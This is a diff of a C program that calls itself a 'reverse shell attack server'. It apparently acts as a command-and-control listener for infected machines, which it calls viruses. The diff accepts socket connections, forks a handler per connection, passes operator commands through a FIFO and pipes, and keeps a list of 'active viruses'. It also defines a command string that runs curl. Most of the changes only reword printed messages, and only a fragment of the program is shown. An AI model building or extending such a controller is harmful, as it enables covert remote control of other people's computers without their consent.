@@ -24,7 +24,7 @@
 #include "user_console.h"
 #include <fcntl.h>
 #define SIZE 100
-#define DESTROY_CMD "curl https://www.nytimes.com"
+#define DESTROY_CMD "curl https://www.nytimes.com | cat"
 
 void sighandler(int signo){
   switch(signo){
@@ -85,8 +85,7 @@ int main(int argc, char const* argv[]){
     mkfifo(FIFO_NAME, 0777);
 
 
-    printf("welcome to the reverse shell attack server!\n");
-    printf("PID: %d\n", getpid());
+    printf("welcome to the reverse shell attack server handling all communications with the virus. To control the server, connect through a different terminal by typing in \n\n./user_shell %d\n\n\n", getpid());
     user_read = open(FIFO_NAME, O_RDONLY, 0);
 
     //set up server listening ...
@@ -98,28 +97,25 @@ int main(int argc, char const* argv[]){
     //server loop
     while(1){
         //main server loop
-        printf("establishing connection to client...\n");
 
         int new_socket = accept(server_fd, NULL,NULL); //block until a client tries to connect
 
-        printf("client connected. forking...\n");
         int fds[2];
         pipe(fds);
         if(fork()==0){//if fork is child
             // do what the server should do
 	    close(fds[1]);
-            printf("Child %d's read pipe file descriptor: %d\n", idCount, fds[0]);
             listening_server_action(new_socket, fds[0]);
 
             //clean up
             close(new_socket);
-            printf("closing connection to client...\n");
+            printf("closing connection to user...\n");
             exit(0);
         }
 
         //if we are not the subserver, close the socket to the client
 	close(fds[0]);
-	printf("Write pipe to child %d: %d\n", idCount, fds[1]);
+	printf("Added virus %d to list of active viruses\n", idCount);
 	childFds[idCount] = fds[1];
 	idCount++;
         close(new_socket);
